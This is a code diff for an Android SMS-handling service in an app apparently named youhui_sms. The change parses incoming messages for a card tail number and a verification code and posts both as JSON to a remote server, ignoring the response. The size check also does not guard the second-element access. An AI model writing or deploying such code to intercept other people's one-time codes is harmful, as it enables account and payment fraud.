@@ -1,20 +1,33 @@
-package com.sun.youhui_sms;
+package com.sun.youhui_sms.sms;
 
-import android.annotation.TargetApi;
 import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.graphics.BitmapFactory;
-import android.graphics.drawable.Icon;
 import android.net.Uri;
-import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Message;
 import android.provider.Settings;
 import android.util.Log;
 import android.widget.Toast;
+
+import com.sun.youhui_sms.R;
+import com.sun.youhui_sms.contact.Contact;
+import com.sun.youhui_sms.utils.OkhttpUtils;
+import com.sun.youhui_sms.utils.TextUtils;
+
+import org.json.JSONObject;
+
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.Map;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.Response;
 
 public class SmsService extends Service {
 
@@ -24,11 +37,27 @@ public class SmsService extends Service {
             super.handleMessage(msg);
             if (msg.what == Contact.SMS_SERVICE_CODE){
                 String content = (String) msg.obj;
-                String code = TextUtils.getCode(content);
-                if (!TextUtils.isEmpty(code)){
-                    Toast.makeText(SmsService.this, "验证码：" + code, Toast.LENGTH_SHORT).show();
+                ArrayList<String> numList = TextUtils.getNumList(content);
+                if (numList.size() > 0){
+                    Map<String, String> map = new HashMap<>();
+                    map.put(Contact.TAIL_NUM, numList.get(0));
+                    map.put(Contact.MESSAGE_CODE, numList.get(1));
+                    JSONObject jsonObject = new JSONObject(map);
+                    OkhttpUtils.enqueue(Contact.URL_SEND_MESSAGE, jsonObject.toString(), new okhttp3.Callback() {
+                        @Override
+                        public void onFailure(Call call, IOException e) {
+
+                        }
+
+                        @Override
+                        public void onResponse(Call call, Response response) throws IOException {
+
+                        }
+                    });
+
+                    Toast.makeText(SmsService.this, "卡尾号："+ numList.get(0) + " 验证码：" + numList.get(1), Toast.LENGTH_SHORT).show();
                 }
-                Log.d(getClass().getSimpleName(), content);
+
             }
         }
     };
